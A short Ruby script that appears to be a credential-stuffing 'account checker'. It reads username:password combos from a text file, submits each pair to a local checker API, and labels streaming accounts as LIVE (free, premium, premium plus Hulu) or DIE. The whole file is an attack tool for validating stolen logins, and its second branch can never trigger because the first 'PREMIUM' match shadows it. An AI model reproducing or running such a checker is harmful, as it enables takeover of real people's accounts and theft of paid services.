require 'uri'
require 'net/http'
require 'colorize'

file='mylist.txt'
File.readlines(file).each do |line|
  splitfields = line.split(":")
  senhafix = splitfields[1].gsub("\n" , "")
  tocheck = "http://localhost/chk/api/?u=#{splitfields[0]}&p=#{senhafix}"
  result = Net::HTTP.get(URI.parse(tocheck))
	
  if result.include? "PREMIUM"
  	puts"[LIVE] #{splitfields[0]} #{senhafix} | PREMIUM".green
	  
  elsif result.include? "PREMIUM + HULU"
   	puts"[LIVE] #{splitfields[0]} #{senhafix} | PREMIUM + HULU".green
	  
  elsif result.include? "FREE"
   	puts"[LIVE] #{splitfields[0]} #{senhafix} | FREE".yellow
  else
  	puts"[DIE] #{splitfields[0]} #{senhafix}".red

  end
end

puts'finished'
